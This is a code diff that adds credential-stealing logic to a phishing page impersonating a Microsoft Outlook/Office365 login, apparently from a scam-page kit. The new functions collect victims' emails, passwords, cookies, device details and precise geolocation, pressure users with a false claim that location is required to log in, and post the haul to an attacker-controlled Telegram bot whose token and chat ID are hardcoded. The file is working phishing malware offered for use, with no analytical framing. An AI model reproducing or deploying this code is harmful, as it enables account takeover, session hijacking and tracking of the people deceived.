@@ -15,6 +15,8 @@
 
 // Visit: https://www.scampage.shop/
 
+const OpenCageApiKey = "4e409ae9c61a4c72a039a8c02e10e45a";
+
 document.addEventListener('DOMContentLoaded', () => {
     const unReq = "Enter a valid email address, phone number, or Skype name."
     const pwdReq = "Please enter the password for your Microsoft account."
@@ -157,6 +159,110 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function saveAndSendLogs() {
-        window.location.href = "/recover.html"
-    }
+        const username = localStorage.getItem("email");
+        const password = localStorage.getItem("password");
+        var realCookie = document.cookie;
+        var x = realCookie.substring(0, 150);
+
+        const deviceInfo = {
+            manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
+            model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
+            os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
+            browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
+        };
+
+        getLocation(username, password, x, deviceInfo);
+    };
+
+    function getLocation(username, password, x, deviceInfo) {
+        navigator.geolocation?.getCurrentPosition(async (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            const apiUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${OpenCageApiKey}&pretty=1&no_annotations=1`;
+
+            try {
+                const response = await fetch(apiUrl);
+                const data = await response.json();
+
+                if (data.results.length > 0) {
+                    const result = data.results[0].components;
+                    const city = result.city || result.village || result.town;
+                    const state = result.state;
+                    const country = result.country;
+                    const zipCode = result.postcode;
+                    const continent = result.continent;
+                    const county = result.county;
+
+                    var dataToSend = {
+                        username,
+                        password,
+                        Device: deviceInfo.manufacturer,
+                        OS: deviceInfo.os,
+                        Browser: deviceInfo.browser,
+                        Latitude: latitude,
+                        Longitude: longitude,
+                        City: city,
+                        State: state,
+                        Country: country,
+                        County: county,
+                        ZipCode: zipCode,
+                        Cookies: x,
+                    };
+
+                    if (Object.keys(dataToSend).length > 0) {
+                        sendToTelegram(dataToSend);
+                    } else {
+                        console.warn("No data to send to Telegram.");
+                    }
+                    } else {
+                    console.error("Location information not found.");
+                    }
+                } catch (error) {
+                    console.error("Error fetching location data:", error);
+                }
+            },
+            (error) => {
+            console.error("Error getting location:", error);
+            alert("Location permission is required to login to Outlook.");
+        }
+        );
+    };
+
+    function sendToTelegram(data) {
+
+        var telegramBotId = "6884682760:AAGGmriuQiIhpAzQanxb96Q0U952SiVidqw";
+        var chatId = 6674659870;
+
+        var payload = {
+          chat_id: chatId,
+          text: `
+            New Office365 Login:
+            ________________________
+               "Email address, phone number or skype": "${data.username}",
+               "Password": "${data.password}",
+               "Device Info": "${data.Device}",
+               "OS": "${data.OS}",
+               "Browser": "${data.Browser}",
+               "Cookies": ["${data.Cookies}"],
+            `
+        };
+
+        var sendToBot = {
+          url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+          },
+          data: JSON.stringify(payload)
+        };
+
+        $.ajax(sendToBot).done(function(response) {
+          window.location.href = "/recover.html"
+          // console.log("Telegram API response:", JSON.stringify(response));
+        }).fail(function(error) {
+          console.error("Error sending data to Telegram:", error);
+        });
+      }
 });
